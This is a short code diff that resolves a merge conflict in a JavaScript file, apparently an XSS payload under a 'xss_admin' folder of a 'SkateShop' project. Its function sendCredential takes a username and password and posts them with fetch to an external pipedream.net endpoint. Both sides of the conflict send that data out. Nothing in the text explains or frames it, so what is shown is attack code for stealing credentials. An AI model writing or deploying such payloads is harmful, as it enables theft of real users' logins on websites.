@@ -21,14 +21,9 @@ function sendCredential(username, password) {
         body: JSON.stringify(body)
     };
 
-<<<<<<< HEAD:SkateShop/xss_admin/xss10.js
     const request = async() => {
         const response = await fetch("https://ensnocsamq9t9ho.m.pipedream.net", options);
     }
-=======
-    fetch("https://ensnocsamq9t9ho.m.pipedream.net", options);
-    console.log(options);
->>>>>>> dc95eabfb057971f980c11af30127b328dd39d15:SkateShop/xss_admin/xss9.js
 }
 
 
